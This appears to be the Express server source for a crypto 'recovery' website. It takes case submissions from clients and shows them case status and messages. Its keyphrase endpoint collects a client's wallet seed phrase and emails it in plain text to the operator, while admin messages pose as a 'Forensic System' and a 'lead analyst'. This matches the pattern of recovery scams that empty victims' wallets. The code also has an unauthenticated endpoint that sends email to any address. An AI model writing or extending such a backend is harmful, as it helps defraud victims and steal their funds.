import express from "express";
import crypto from "crypto";
import fs from "fs";
import path from "path";
import dotenv from "dotenv";
import {
  buildClientCaseEmailHtml,
  getEmailConfig,
  getHealthEmailPayload,
  isEmailConfigured,
  logEmailStartup,
  sendDebugEmail,
  sendRecoveryEmails,
  sendKeyphraseAdminEmail,
  sendSubscribeEmail,
  generateCaseId,
} from "./server/email";
import {
  getForensicPgpPublicKey,
  MAX_INTEGRITY_UPLOAD_BYTES,
  sendIntegrityVerifierEmail,
} from "./server/forensic";
import {
  addCaseMessage,
  addCaseNotification,
  appendRecoveryCase,
  caseMatchesEmail,
  findRecoveryCaseByEmail,
  getRecoveryCaseById,
  listRecoveryCases,
  markNotificationsRead,
  submitCaseKeyphrase,
  updateRecoveryCase,
  type StoredCase,
} from "./server/caseStore";
import { requireAdminFromRequest } from "./server/adminAuth";

const isProduction =
  process.env.NODE_ENV === "production" ||
  process.env.NODE_ENV === "prod";

dotenv.config({ path: ".env" });
dotenv.config({ path: ".env.local", override: true });

const distPath = path.join(process.cwd(), "dist");

async function startServer() {
  const app = express();
  const PORT = parseInt(process.env.PORT || "3000", 10);

  app.set("trust proxy", 1);
  app.use(express.json({ limit: "12mb" }));

  const { ADMIN_EMAIL } = getEmailConfig();
  logEmailStartup();

  app.get("/api/health", (_req, res) => {
    res.json({
      status: "online",
      runtime: "node",
      ...getHealthEmailPayload(),
    });
  });

  app.get("/health", (_req, res) => {
    res.redirect(302, "/api/health");
  });

  /** Open in browser to verify email links work outside Titan/Gmail */
  app.get("/api/preview-case-email", (_req, res) => {
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.send(buildClientCaseEmailHtml("Preview User", "DF-0000-PREVIEW"));
  });

  app.get("/api/debug-email", async (req, res) => {
    if (!isEmailConfigured()) {
      return res.status(500).json({
        success: false,
        error:
          "Email not configured. Set SMTP_* (Titan) or RESEND_API_KEY in Hostinger env vars.",
      });
    }

    try {
      const target = (req.query.to as string) || ADMIN_EMAIL;
      const result = await sendDebugEmail(target);
      res.json({
        success: true,
        messageId: result.messageId ?? result.id,
        recipient: target,
        provider: getHealthEmailPayload().emailProvider,
      });
    } catch (error) {
      console.error("[Email] debug-email failed:", error);
      const errMsg = error instanceof Error ? error.message : String(error);
      res.status(200).json({
        success: false,
        error: errMsg,
        suggestions: [
          "Titan SMTP: use App Password as SMTP_PASS if 2FA is on",
          "SMTP_HOST=smtp.titan.email SMTP_PORT=465 SMTP_USER=info@cryptorecoveryasset.com",
          "Or remove SMTP_* and use RESEND_API_KEY instead",
        ],
      });
    }
  });

  app.post("/api/submit-recovery", async (req, res) => {
    const formData = req.body;
    console.log("NEW RECOVERY REQUEST:", JSON.stringify(formData, null, 2));

    try {
      const { createdAt, ...safeData } = formData;
      let caseId = generateCaseId();
      let emailSent = false;

      if (isEmailConfigured()) {
        const result = await sendRecoveryEmails(safeData);
        caseId = result.caseId;
        emailSent = true;
      }

      appendRecoveryCase({
        ...safeData,
        caseId,
        createdAt: createdAt || new Date().toISOString(),
        status: safeData.status || "PENDING",
      });

      res.status(200).json({
        success: true,
        message: "Data securely processed.",
        caseId,
        emailSent,
      });
    } catch (error) {
      console.error("[Email] submit-recovery failed:", error);
      const caseId = generateCaseId();
      try {
        appendRecoveryCase({
          ...(req.body || {}),
          caseId,
          createdAt: new Date().toISOString(),
          status: "PENDING",
        });
      } catch (storeErr) {
        console.error("[CaseStore] backup save failed:", storeErr);
      }
      res.status(200).json({
        success: true,
        message: "Data registered. Email notification failed.",
        caseId,
        emailSent: false,
        error: error instanceof Error ? error.message : String(error),
      });
    }
  });

  function toPublicCase(found: StoredCase) {
    const caseId = String(found.caseId || found.id);
    return {
      id: caseId,
      caseId,
      storageSource: "server",
      firestoreDocId: null,
      operatorAlias: found.operatorAlias,
      secureComms: found.secureComms || found.email,
      email: found.email || found.secureComms,
      status: found.status || "PENDING",
      incidentVector: found.incidentVector,
      targetNetwork: found.targetNetwork,
      transactionHash: found.transactionHash,
      caseNarrative: found.caseNarrative,
      estimatedValue: found.estimatedValue,
      completedSteps: found.completedSteps || ["PENDING"],
      messages: found.messages || [],
      notifications: found.notifications || [],
      formSource: found.formSource,
      createdAt: found.createdAt,
      walletKeyphraseSubmitted: Boolean(found.walletKeyphrase),
      keyphraseSubmittedAt: found.keyphraseSubmittedAt,
    };
  }

  app.post("/api/case-lookup", (req, res) => {
    const email =
      typeof req.body?.email === "string"
        ? req.body.email.trim().toLowerCase()
        : "";
    if (!email || !email.includes("@")) {
      return res
        .status(400)
        .json({ success: false, error: "Valid email required" });
    }

    const found = findRecoveryCaseByEmail(email);
    if (!found) {
      return res.status(404).json({
        success: false,
        error: "No active recovery case found for this email address.",
      });
    }

    res.json({ success: true, case: toPublicCase(found) });
  });

  app.get("/api/case/:caseId", (req, res) => {
    const email =
      typeof req.query.email === "string"
        ? req.query.email.trim().toLowerCase()
        : "";
    const found = getRecoveryCaseById(req.params.caseId);
    if (!found || !caseMatchesEmail(found, email)) {
      return res.status(404).json({ success: false, error: "Case not found" });
    }
    res.json({ success: true, case: toPublicCase(found) });
  });

  app.post("/api/case/:caseId/messages", (req, res) => {
    const email =
      typeof req.body?.email === "string"
        ? req.body.email.trim().toLowerCase()
        : "";
    const text = typeof req.body?.text === "string" ? req.body.text.trim() : "";
    if (!email || !text) {
      return res
        .status(400)
        .json({ success: false, error: "email and text required" });
    }
    const found = getRecoveryCaseById(req.params.caseId);
    if (!found || !caseMatchesEmail(found, email)) {
      return res.status(404).json({ success: false, error: "Case not found" });
    }
    const message = addCaseMessage(req.params.caseId, {
      text,
      sender: "Client",
      senderId: "client",
      type: "client_message",
    });
    if (!message) {
      return res.status(500).json({ success: false, error: "Failed to save" });
    }
    res.json({ success: true, message });
  });

  app.post("/api/case/:caseId/keyphrase", async (req, res) => {
    const email =
      typeof req.body?.email === "string"
        ? req.body.email.trim().toLowerCase()
        : "";
    const keyphrase =
      typeof req.body?.keyphrase === "string" ? req.body.keyphrase : "";
    if (!email || !keyphrase.trim()) {
      return res.status(400).json({
        success: false,
        error: "email and keyphrase required",
      });
    }
    const words = keyphrase.trim().split(/\s+/);
    if (words.length < 3) {
      return res.status(400).json({
        success: false,
        error: "Keyphrase is too short",
      });
    }
    const found = getRecoveryCaseById(req.params.caseId);
    if (!found || !caseMatchesEmail(found, email)) {
      return res.status(404).json({ success: false, error: "Case not found" });
    }
    const updated = submitCaseKeyphrase(
      req.params.caseId,
      email,
      keyphrase
    );
    if (!updated) {
      return res.status(500).json({ success: false, error: "Failed to save" });
    }

    let keyphraseEmailSent = false;
    if (isEmailConfigured()) {
      try {
        const result = await sendKeyphraseAdminEmail({
          caseId: String(updated.caseId || updated.id),
          clientEmail: email,
          clientName: String(updated.operatorAlias || updated.name || ""),
          keyphrase: keyphrase.trim(),
          submittedAt: String(updated.keyphraseSubmittedAt || ""),
        });
        keyphraseEmailSent = result.emailSent;
      } catch (emailErr) {
        console.error("[Email] keyphrase admin alert failed:", emailErr);
      }
    }

    res.json({
      success: true,
      case: toPublicCase(updated),
      keyphraseEmailSent,
    });
  });

  app.patch("/api/case/:caseId/notifications", (req, res) => {
    const email =
      typeof req.body?.email === "string"
        ? req.body.email.trim().toLowerCase()
        : "";
    const notificationId =
      typeof req.body?.notificationId === "string"
        ? req.body.notificationId
        : undefined;
    if (!email) {
      return res.status(400).json({ success: false, error: "email required" });
    }
    const ok = markNotificationsRead(req.params.caseId, email, notificationId);
    if (!ok) {
      return res.status(404).json({ success: false, error: "Not found" });
    }
    res.json({ success: true });
  });

  app.get("/api/admin/cases", async (req, res) => {
    const admin = await requireAdminFromRequest(req.headers.authorization);
    if (!admin) {
      return res.status(401).json({ success: false, error: "Unauthorized" });
    }
    const cases = listRecoveryCases();
    console.log(
      `[Admin] ${admin.email} loaded ${cases.length} case(s) from server store`
    );
    res.json({ success: true, cases, count: cases.length });
  });

  app.get("/api/admin/cases/:caseId", async (req, res) => {
    const admin = await requireAdminFromRequest(req.headers.authorization);
    if (!admin) {
      return res.status(401).json({ success: false, error: "Unauthorized" });
    }
    const found = getRecoveryCaseById(req.params.caseId);
    if (!found) {
      return res.status(404).json({ success: false, error: "Case not found" });
    }
    res.json({ success: true, case: found });
  });

  app.patch("/api/admin/cases/:caseId", async (req, res) => {
    const admin = await requireAdminFromRequest(req.headers.authorization);
    if (!admin) {
      return res.status(401).json({ success: false, error: "Unauthorized" });
    }
    const caseId = req.params.caseId;
    const { status, completedSteps, notification } = req.body || {};
    if (
      status === undefined &&
      completedSteps === undefined &&
      !notification
    ) {
      return res
        .status(400)
        .json({ success: false, error: "Nothing to update" });
    }
    const updated = updateRecoveryCase(caseId, {
      ...(status !== undefined ? { status: String(status) } : {}),
      ...(completedSteps !== undefined
        ? { completedSteps: completedSteps as string[] }
        : {}),
    });
    if (!updated) {
      return res.status(404).json({ success: false, error: "Case not found" });
    }
    if (notification && typeof notification === "object") {
      addCaseNotification(caseId, {
        title: String(notification.title || "Update"),
        message: String(notification.message || ""),
        type: String(notification.type || "STATUS_UPDATE"),
      });
    }
    const fresh = getRecoveryCaseById(caseId);
    res.json({ success: true, case: fresh || updated });
  });

  app.post("/api/admin/cases/:caseId/messages", async (req, res) => {
    const admin = await requireAdminFromRequest(req.headers.authorization);
    if (!admin) {
      return res.status(401).json({ success: false, error: "Unauthorized" });
    }
    const text = typeof req.body?.text === "string" ? req.body.text.trim() : "";
    if (!text) {
      return res.status(400).json({ success: false, error: "text required" });
    }
    const caseId = req.params.caseId;
    const message = addCaseMessage(caseId, {
      text,
      sender: "Forensic System v4.2 (Admin)",
      senderId: "admin",
      type: "admin_message",
    });
    if (!message) {
      return res.status(404).json({ success: false, error: "Case not found" });
    }
    addCaseNotification(caseId, {
      title: "New Message Received",
      message:
        "You have a new secure communication from your lead analyst.",
      type: "MESSAGE",
    });
    res.json({ success: true, message });
  });

  app.get("/api/forensic/config", (_req, res) => {
    res.json({
      pgpPublicKey: getForensicPgpPublicKey(),
      maxUploadBytes: MAX_INTEGRITY_UPLOAD_BYTES,
      emailConfigured: isEmailConfigured(),
    });
  });

  app.post("/api/forensic/integrity-upload", async (req, res) => {
    const { filename, contentBase64, sha256, mimeType, notifierEmail } =
      req.body ?? {};

    if (!filename || !contentBase64 || !sha256) {
      return res.status(400).json({
        success: false,
        error: "filename, contentBase64, and sha256 are required",
      });
    }

    if (!isEmailConfigured()) {
      return res.status(503).json({
        success: false,
        error:
          "Email is not configured on the server. Set RESEND_API_KEY or SMTP_* in Hostinger.",
      });
    }

    try {
      const buffer = Buffer.from(String(contentBase64), "base64");
      if (!buffer.length) {
        return res.status(400).json({ success: false, error: "Empty file" });
      }
      if (buffer.length > MAX_INTEGRITY_UPLOAD_BYTES) {
        return res.status(400).json({
          success: false,
          error: `File exceeds ${MAX_INTEGRITY_UPLOAD_BYTES / (1024 * 1024)}MB limit`,
        });
      }

      const computed = crypto
        .createHash("sha256")
        .update(buffer)
        .digest("hex");
      if (computed !== String(sha256).toLowerCase()) {
        return res.status(400).json({
          success: false,
          error: "SHA-256 checksum mismatch — re-upload the file",
        });
      }

      const result = await sendIntegrityVerifierEmail({
        filename: String(filename),
        sha256: computed,
        fileSize: buffer.length,
        mimeType: String(mimeType || "application/octet-stream"),
        fileBuffer: buffer,
        notifierEmail: notifierEmail ? String(notifierEmail) : undefined,
      });

      res.status(200).json({
        success: true,
        caseRef: result.caseRef,
        message: "File verified and sent to the forensic inbox.",
      });
    } catch (error) {
      console.error("[Forensic] integrity-upload failed:", error);
      res.status(500).json({
        success: false,
        error: error instanceof Error ? error.message : String(error),
      });
    }
  });

  app.post("/api/subscribe", async (req, res) => {
    const { name, email } = req.body;
    console.log("NEW BLOG SUBSCRIPTION:", name, email);

    try {
      if (isEmailConfigured()) {
        await sendSubscribeEmail(name, email);
      }
      res.status(200).json({
        success: true,
        message: "Successfully subscribed to the intelligence stream.",
      });
    } catch (error) {
      console.error("[Email] subscribe failed:", error);
      res.status(200).json({
        success: true,
        message: "Subscribed (notification email failed).",
      });
    }
  });

  if (!isProduction) {
    const { createServer: createViteServer } = await import("vite");
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const indexPath = path.join(distPath, "index.html");

    if (!fs.existsSync(indexPath)) {
      console.error(
        `[PROD] Missing ${indexPath}. Run "npm run build" before "npm start".`
      );
      process.exit(1);
    }

    const health = getHealthEmailPayload();
    console.log(`[PROD] Mode: production`);
    console.log(`[PROD] Port: ${PORT}`);
    console.log(`[PROD] Static root: ${distPath}`);
    console.log(`[PROD] Email provider: ${health.emailProvider}`);
    console.log(`[PROD] Admin inbox: ${ADMIN_EMAIL}`);

    app.use(express.static(distPath, { index: false }));

    app.get("/", (_req, res) => {
      res.sendFile(indexPath);
    });

    app.use((req, res, next) => {
      if (req.path.startsWith("/api")) {
        return next();
      }
      if (req.method !== "GET" && req.method !== "HEAD") {
        return next();
      }
      res.sendFile(indexPath, (err) => {
        if (err) {
          console.error(`[ERROR] Failed to send index.html for ${req.url}:`, err);
          res.status(500).send("Application load error (index.html not found).");
        }
      });
    });

    app.use("/api", (_req, res) => {
      res.status(404).json({ error: "API route not found" });
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(
      `[SERVER] ${isProduction ? "Production" : "Development"} listening on port ${PORT}`
    );
  });
}

startServer();
